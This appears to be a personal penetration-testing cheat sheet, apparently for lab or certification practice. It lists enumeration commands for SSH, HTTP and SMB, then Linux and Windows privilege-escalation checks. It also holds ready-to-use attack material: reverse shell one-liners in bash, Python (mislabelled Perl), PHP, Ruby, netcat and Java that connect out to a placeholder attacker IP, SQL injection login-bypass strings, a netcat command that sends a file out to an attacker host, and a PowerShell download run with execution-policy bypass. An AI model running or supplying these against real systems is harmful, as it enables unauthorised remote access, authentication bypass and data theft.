look at scope of Angular js
https://nvisium.com/blog/2019/01/10/angular-for-pentesters-part-1.html
https://www.youtube.com/watch?v=67Yc8_Bszlk
https://ryhanson.com/stealing-session-tokens-on-plunker-with-an-angular-expression-injection/

==============================================================================================================================
ENUMERATION OF PORTS
==============================================================================================================================

22 - SSH
''''''''''''''''
      * Try connecting with wrong pass, look at allowed authentication methods (public key, password, etc.) 

80 - HTTP
''''''''''''''''
      * Use dirbuster/gobuster/Burp Spider to find directories
      * nikto -h http://<IP ADDR>: Scan with Nikto
      * Use Wappalyzer to check for technologies on webpage

139/445 - SMB
''''''''''''''''
      * smbclient -L <IP ADDR>: List SMB shares
      * smbclient //<IP ADDR>/<SHARE NAME> -U ""%"": Connect to SMB share
      * (Impacket) python smbclient.py <USER>:<PASSWORD>@<ID ADDR>: Connect to SMB
      * 


443 - HTTPS
''''''''''''''''





==============================================================================================================================
REVERSE SHELLS
==============================================================================================================================
Listen on Kali: nc -lvp <PORT>

Bash: bash -i >& /dev/tcp/<IP ADDR>/<PORT> 0>&1

Perl: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP ADDR>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP: php -r '$sock=fsockopen("<IP ADDR>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby: ruby -rsocket -e'f=TCPSocket.open("<IP ADDR>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Netcat with -e: nc -e /bin/sh <IP ADDR> <PORT>

Netcat without -e: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP ADDR> <PORT> >/tmp/f

Java: r = Runtime.getRuntime()
      p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP ADDR>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
      p.waitFor()
      
==============================================================================================================================
SQL INJECTION STRINGS
==============================================================================================================================
      
' or 1=1--

' or 1=1#

' or 1=1/*

') or '1'='1--

') or ('1'='1--

* When using login form, capture a submission with burp, save as a .req file, then use SQLMap to test form.


______________________________________________________________________________________________________________________________         
==============================================================================================================================     
 __       __  .__   __.  __    __  ___   ___ 
|  |     |  | |  \ |  | |  |  |  | \  \ /  / 
|  |     |  | |   \|  | |  |  |  |  \  V  /  
|  |     |  | |  . `  | |  |  |  |   >   <   
|  `----.|  | |  |\   | |  `--'  |  /  .  \  
|_______||__| |__| \__|  \______/  /__/ \__\ 
==============================================================================================================================
                                                  
==============================================================================================================================
LINUX PRIV ESC
==============================================================================================================================

Commands
'''''''''''''
w: Other users logged in 

uname -a: Machine info, kernel, etc.

cat /etc/passwd: View accounts

find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;: Find writable directories
find / -type d -writable 2> /dev/null: Find writable directories

find / -perm -u=s -type f 2>/dev/null: Find SUID files

python -m SimpleHTTPServer 80: Make machine serve over port 80 (can be used on both Kali and target for effect) 
      -> wget http://<IP ADDRR>/file.ext: Retreives file from serving machine
    
  
Scripts
''''''''''''''
      * linenum.sh
      * suggester.sh 
      * pspy: View processes in real time
      
Other
''''''''''''''
     * https://gtfobins.github.io/ : Check capabilities of binaries with this site

==============================================================================================================================
LINUX FILE TRANSFER/EXFILTRATION
==============================================================================================================================

scp <PATH ON KALI> <USERNAME>@<TARGET IP>:<PATH ON TARGET>: Transfer file TO TARGET FROM ATTACKER

ATTACKER: nc -l -p <PORT> > <FILENAME>
TARGET: nc -w 3 <ATTACKER IP> <PORT> < <FILENAME>
 
 
______________________________________________________________________________________________________________________________           
==============================================================================================================================     
____    __    ____  __  .__   __.  _______   ______   ____    __    ____   _______.
\   \  /  \  /   / |  | |  \ |  | |       \ /  __  \  \   \  /  \  /   /  /       |
 \   \/    \/   /  |  | |   \|  | |  .--.  |  |  |  |  \   \/    \/   /  |   (----`
  \            /   |  | |  . `  | |  |  |  |  |  |  |   \            /    \   \    
   \    /\    /    |  | |  |\   | |  '--'  |  `--'  |    \    /\    / .----)   |   
    \__/  \__/     |__| |__| \__| |_______/ \______/      \__/  \__/  |_______/    
==============================================================================================================================                                                                                       

==============================================================================================================================
WINDOWS PRIV ESC
==============================================================================================================================

powershell.exe $PSVersionTable.PSVersion: Output powershell version

systeminfo: Get OS + service pack info -> search for exploits

net users: Lists users

Scripts
''''''''''''''
      * jaws
      * powerup.ps1

==============================================================================================================================
WINDOWS FILE TRANSFER/EXFILTRATION
==============================================================================================================================

powershell -nop -exec bypass -command "Invoke-WebRequest -Uri http://<IP ADDR>/<FILE> -Outfile C:\<PATH TO FILE>": Get file     
     

 
